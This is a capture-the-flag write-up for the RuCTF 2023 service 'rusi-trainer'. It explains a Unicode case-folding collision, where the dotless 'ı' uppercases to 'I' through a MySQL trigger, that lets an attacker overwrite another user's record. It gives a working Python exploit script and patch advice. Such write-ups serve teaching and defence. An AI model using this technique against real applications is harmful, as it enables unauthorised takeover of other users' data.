# RuCTF 2023 | rusi-trainer

## Description

This service stores the fighting techniques of the ancient Rus. (Udar)

- Service use name as primary key in database MySQL.
- The same request to the database was used both to create and update actions.
- Before db execute it try to get object from db using name from input as is.
- If it does not exist, a database query is executed
- If it exists and the user is the object's creator, a query is made to the database, causing updates to occur.
- In every insert into the database, the key (name) is converted to uppercase using a trigger.

## Vulnerability

Vulnerability in service is unexpected collision in primary keys on insert.

You need to choose a name so that when you try to retrieve the object by name, it will not be in the database. 

But at the same time, when the insert query executed the trigger convert name to upper case, a conflict occurs, and we updated an already existing record in the database.

So you need a symbol that is converted into another symbol by the uppercase function.

That symbol is: `ı` - turkish letter

```javascript
'ı' == 'i' // false
```
```javascript
'ı'.toUpperCase() == 'i'.toUpperCase() // true
```

```javascript
'ı'.toUpperCase().toLowerCase() == 'i'.toUpperCase().toLowerCase() // true
```



## Exploitation

The checker generates too long flag_id, so in every name of Udar (this is flag id) you can find `i` symbol. 
So you need to replace it with `ı` and make `PUT` request to update `trustedRusi` (add your hacker user to the trusted list).
This will make it possible to read the flag using a regular get request.

[Sploit](/sploits/rusi-trainer/rusi-trainer.sploit.py)
```python3
hacker_username = f'hac3r{uuid.uuid4()}'
hacker_password = f'hah-{uuid.uuid4()}'
requests.post(api_url + 'auth/register/', json={
    'username': hacker_username,
    'password': hacker_password
})
hacker_token = requests.post(api_url + 'auth/login/', json={
    'username': hacker_username,
    'password': hacker_password
}).json()['accessToken']
hacker_id = requests.get(f'{api_url}users/{urllib.parse.quote_plus(hacker_username)}/', headers={
    'x-access-token': hacker_token
}).json()['id']
name = PUBLIC_FLAG_ID.upper().lower()
if 'i' in name:
    name = name.replace('i', 'ı')
else:
    raise RuntimeError('No "i" symbol in FLAG_ID')
requests.put(f'{api_url}udar/', headers={'x-access-token': hacker_token}, json={
    'name': base69.encodeString(name),
    'trustedRusi': [hacker_id],
    'phonk': 'ULTRA HARD 23',
    'map': 1,
    'description': 'oldone'
})
result = requests.get(f'{api_url}udar/{PUBLIC_FLAG_ID.upper()}/',
                      headers={'x-access-token': hacker_token}).json()
print(result['phonk']) # There flag
```

## Patch

There many ways to fix it. Use any of that

- Go to upper case name from input before do get request
- Use two different requests to database for insert and update
- Replace MySQL to MariaDB (in MySQL `'ı' = 'i' // False'` but in MariaDB `'ı' = 'i' // True'` )



